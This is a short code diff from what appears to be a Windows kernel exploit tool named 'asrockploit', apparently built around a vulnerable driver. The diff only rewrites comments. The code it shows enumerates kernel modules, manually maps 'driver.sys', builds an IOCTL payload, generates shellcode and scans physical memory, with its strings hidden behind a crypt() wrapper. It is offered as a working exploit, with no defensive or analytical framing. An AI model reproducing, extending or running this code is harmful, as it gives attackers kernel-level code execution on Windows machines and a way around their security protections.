@@ -269,7 +269,7 @@ public:
                     printf(crypt("[+] Reloc of type IMAGE_REL_BASED_ABSOLUTE at offset %#x+%#llx\n"), rva, offset);
                 }
                 else {
-                    printf(crypt("[-] Not support reloc type: 0x%llx!\n"), reloc_type); //32 bit export koyan eşekler için
+                    printf(crypt("[-] Not support reloc type: 0x%llx!\n"), reloc_type); //32 bit export test
                     std::getchar();
                 }
                 reloc_entry++;
@@ -404,7 +404,7 @@ public:
             0x82, 0x46, 0x04, 0x00, 0x00
         };
 
-        uint64_t function_offset = 0x290;  // hardcode anlarısn ya
+        uint64_t function_offset = 0x290;  // harcoding sanit
         const size_t buf_size = 0x10000;
         BYTE buf[buf_size];
 
@@ -476,11 +476,11 @@ public:
 
 int main()
 {
-	AddDllDirectory(crypt(L"C:\\Windows\\System32\\drivers")); //asrbubum
+	AddDllDirectory(crypt(L"C:\\Windows\\System32\\drivers")); //asrscan
 
     asrockploit ploiter;
     ploiter.enum_kernel_modules();
-    ploiter.manual_map("driver.sys"); //exe yanında export için kullanılan driver olması gerek
+    ploiter.manual_map("driver.sys"); //
     ploiter.create_ioctl_payload();
     ploiter.generate_shellcode();
     ploiter.scan_physical_memory();
